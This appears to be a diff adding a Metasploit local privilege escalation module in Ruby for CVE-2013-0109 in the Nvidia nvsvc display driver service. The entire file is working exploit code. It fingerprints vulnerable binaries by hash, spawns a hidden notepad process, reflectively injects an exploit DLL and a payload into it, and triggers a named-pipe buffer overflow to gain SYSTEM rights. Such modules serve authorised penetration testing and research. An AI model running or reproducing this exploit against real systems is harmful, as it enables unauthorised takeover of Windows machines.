@@ -1,0 +1,168 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex'
+require 'msf/core/post/common'
+require 'msf/core/post/windows/priv'
+require 'msf/core/post/windows/process'
+require 'msf/core/post/windows/reflective_dll_injection'
+require 'msf/core/post/windows/services'
+
+class Metasploit3 < Msf::Exploit::Local
+  Rank = AverageRanking
+
+  include Msf::Post::File
+  include Msf::Post::Windows::Priv
+  include Msf::Post::Windows::Process
+  include Msf::Post::Windows::ReflectiveDLLInjection
+  include Msf::Post::Windows::Services
+
+  def initialize(info={})
+    super(update_info(info, {
+      'Name'            => 'Nvidia (nvsvc) Display Driver Service Local Privilege Escalation',
+      'Description'     => %q{
+        The named pipe, \pipe\nsvr, has a NULL DACL allowing any authenticated user to
+        interact with the service. It contains a stacked based buffer overflow as a result
+        of a memmove operation. Note the slight spelling differences: the executable is 'nvvsvc.exe',
+        the service name is 'nvsvc', and the named pipe is 'nsvr'.
+
+        This exploit automatically targets nvvsvc.exe versions dated Nov 3 2011, Aug 30 2012, and Dec 1 2012.
+        It has been tested on Windows 7 64-bit against nvvsvc.exe dated Dec 1 2012.
+      },
+      'License'         => MSF_LICENSE,
+      'Author'          =>
+        [
+          'Peter Wintersmith', # Original exploit
+          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',   # Metasploit integration
+        ],
+      'Arch'            => ARCH_X86_64,
+      'Platform'        => 'win',
+      'SessionTypes'    => [ 'meterpreter' ],
+      'DefaultOptions'  =>
+        {
+          'EXITFUNC'    => 'thread',
+        },
+      'Targets'         =>
+        [
+          [ 'Windows x64', { } ]
+        ],
+      'Payload'         =>
+        {
+          'Space'       => 2048,
+          'DisableNops' => true,
+          'BadChars'    => "\x00"
+        },
+      'References'      =>
+        [
+          [ 'CVE', '2013-0109' ],
+          [ 'OSVDB', '88745' ],
+          [ 'URL', 'http://nvidia.custhelp.com/app/answers/detail/a_id/3288' ],
+        ],
+      'DisclosureDate' => 'Dec 25 2012',
+      'DefaultTarget'  => 0
+    }))
+
+  end
+
+  def check
+    vuln_hashes = [
+      '43f91595049de14c4b61d1e76436164f',
+      '3947ad5d03e6abcce037801162fdb90d',
+      '3341d2c91989bc87c3c0baa97c27253b'
+    ]
+
+    os = sysinfo["OS"]
+    if os =~ /windows/i
+      svc = service_info 'nvsvc'
+      if svc and svc['Name'] =~ /NVIDIA/i
+        vprint_good("Found service '#{svc['Name']}'")
+
+        begin
+          if is_running?
+            print_good("Service is running")
+          else
+            print_error("Service is not running!")
+          end
+        rescue RuntimeError => e
+          print_error("Unable to retrieve service status")
+        end
+
+        if sysinfo['Architecture'] =~ /WOW64/i
+          path = svc['Command'].gsub('"','').strip
+          path.gsub!("system32","sysnative")
+        else
+          path = svc['Command'].gsub('"','').strip
+        end
+
+        begin
+          hash = client.fs.file.md5(path).unpack('H*').first
+        rescue Rex::Post::Meterpreter::RequestError => e
+          print_error("Error checking file hash: #{e}")
+          return Exploit::CheckCode::Detected
+        end
+
+        if vuln_hashes.include?(hash)
+          vprint_good("Hash '#{hash}' is listed as vulnerable")
+          return Exploit::CheckCode::Vulnerable
+        else
+          vprint_status("Hash '#{hash}' is not recorded as vulnerable")
+          return Exploit::CheckCode::Detected
+        end
+      else
+        return Exploit::CheckCode::Safe
+      end
+    end
+  end
+
+  def is_running?
+    begin
+      status = service_status('nvsvc')
+      return (status and status[:state] == 4)
+    rescue RuntimeError => e
+      print_error("Unable to retrieve service status")
+      return false
+    end
+  end
+
+  def exploit
+    if is_system?
+      fail_with(Exploit::Failure::None, 'Session is already elevated')
+    end
+
+    unless check == Exploit::CheckCode::Vulnerable
+      fail_with(Exploit::Failure::NotVulnerable, "Exploit not available on this system.")
+    end
+
+    print_status("Launching notepad to host the exploit...")
+
+    windir = expand_path("%windir%")
+    cmd = "#{windir}\\SysWOW64\\notepad.exe"
+    process = client.sys.process.execute(cmd, nil, {'Hidden' => true})
+    host_process = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
+    print_good("Process #{process.pid} launched.")
+
+    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
+    library_path = ::File.join(Msf::Config.data_directory,
+                               "exploits",
+                               "CVE-2013-0109",
+                               "nvidia_nvsvc.x86.dll")
+    library_path = ::File.expand_path(library_path)
+
+    print_status("Injecting exploit into #{process.pid} ...")
+    exploit_mem, offset = inject_dll_into_process(host_process, library_path)
+
+    print_status("Exploit injected. Injecting payload into #{process.pid}...")
+    payload_mem = inject_into_process(host_process, payload.encoded)
+
+    # invoke the exploit, passing in the address of the payload that
+    # we want invoked on successful exploitation.
+    print_status("Payload injected. Executing exploit...")
+    host_process.thread.create(exploit_mem + offset, payload_mem)
+
+    print_good("Exploit finished, wait for (hopefully privileged) payload execution to complete.")
+  end
+end
+
